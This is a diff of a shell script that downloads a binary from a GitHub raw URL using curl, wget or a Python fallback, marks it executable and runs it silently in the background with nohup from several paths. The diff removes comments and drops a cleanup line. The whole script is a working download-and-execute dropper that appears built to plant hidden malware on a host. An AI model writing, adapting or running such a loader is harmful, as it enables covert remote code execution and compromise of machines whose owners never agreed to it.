@@ -14,8 +14,8 @@ l16="https://github.com/Slex123-c/ipSlad/raw/refs/heads/main/tcp8711"
 v="aa4876c2"
 rm -rf $v
 
-ARCH="$1"   # 第一个参数作为ARCH
-v="aa4876c2"  # 保存的文件名，可按需修改
+ARCH="$1"  
+v="aa4876c2"  
 
 if [ "${ARCH}" = "ws" ]; then
     (curl -fsSL -m180 "$l64" -o "$v" || wget -T180 -q "$l64" -O "$v" || python -c 'import urllib; urllib.urlretrieve("'"$l32"'", "'"$v"'")')
@@ -30,5 +30,4 @@ fi
 
 chmod +x $v
 (nohup $(pwd)/$v > /dev/null 2>&1 &) || (nohup ./$v > /dev/null 2>&1 &) || (nohup /usr/bin/$v > /dev/null 2>&1 &) || (nohup /usr/libexec/$v > /dev/null 2>&1 &) || (nohup /usr/local/bin/$v > /dev/null 2>&1 &) || (nohup /tmp/$v > /dev/null 2>&1 &)
-rm -rf $v
 #
